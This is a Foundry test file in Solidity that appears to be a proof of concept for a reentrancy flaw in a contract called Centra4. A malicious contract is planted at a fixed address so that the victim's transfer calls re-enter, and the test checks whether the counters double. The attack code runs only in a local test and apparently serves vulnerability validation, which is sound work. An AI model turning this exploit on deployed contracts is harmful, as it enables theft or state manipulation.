// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x524960d55174d912768678d8c606b4d50b79d7b1.sol";

contract MaliciousContract {
    Centra4 public victim;
    uint256 public reentrancyCount = 0;
    uint256 public constant MAX_REENTRANCIES = 1;

    function setVictim(address _victim) public {
        victim = Centra4(_victim);
    }

    function register(string memory) public {
        if (reentrancyCount < MAX_REENTRANCIES) {
            reentrancyCount++;
            victim.transfer();  // Trigger reentrancy
        }
    }

    function transfer(address, uint256) public returns (bool) {
        if (reentrancyCount < MAX_REENTRANCIES) {
            reentrancyCount++;
            victim.transfer();  // Trigger reentrancy
        }
        return true;
    }
}

contract Centra4Test is Test {
    Centra4 public centra;
    address public attacker = address(0xdead);
    address public constant TARGET_ADDRESS = 0x96A65609a7B84E8842732DEB08f56C3E21aC6f8a;
    MaliciousContract public maliciousContractAtFixed;

    function setUp() public {
        centra = new Centra4();
        
        // Deploy a temporary malicious contract to get its bytecode
        MaliciousContract temp = new MaliciousContract();
        bytes memory maliciousCode = address(temp).code;
        
        // Etch malicious contract code to the fixed address
        vm.etch(TARGET_ADDRESS, maliciousCode);
        
        // Create a reference to the malicious contract at fixed address
        maliciousContractAtFixed = MaliciousContract(TARGET_ADDRESS);
        maliciousContractAtFixed.setVictim(address(centra));
    }

    function test_ReentrancyVulnerability() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Pre-trigger state query
        (uint256 initialUserTransfers, uint256 initialGlobalTransfers) = centra.getTransferStats(attacker);
        console2.log("Attacker transfers (before):", initialUserTransfers);
        console2.log("Global transfers (before):", initialGlobalTransfers);
        
        console2.log("--- Trigger Reentrancy ---");
        // Execute attack
        vm.prank(attacker);
        centra.transfer();
        
        console2.log("--- AFTER-Trigger State ---");
        // Post-trigger state query
        (uint256 finalUserTransfers, uint256 finalGlobalTransfers) = centra.getTransferStats(attacker);
        console2.log("Attacker transfers (after):", finalUserTransfers);
        console2.log("Global transfers (after):", finalGlobalTransfers);
        
        console2.log("--- Comparison Verdict ---");
        uint256 userDiff = finalUserTransfers - initialUserTransfers;
        uint256 globalDiff = finalGlobalTransfers - initialGlobalTransfers;
        console2.log("Attacker increment:", userDiff);
        console2.log("Global increment:", globalDiff);
        
        // Vulnerability validation
        bool vulnerabilityExists = (userDiff == 2) && (globalDiff == 2);
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Reentrancy caused double transfer increments");
        } else {
            console2.log("Vulnerability not Exist: Normal transfer increments detected");
        }
    }
}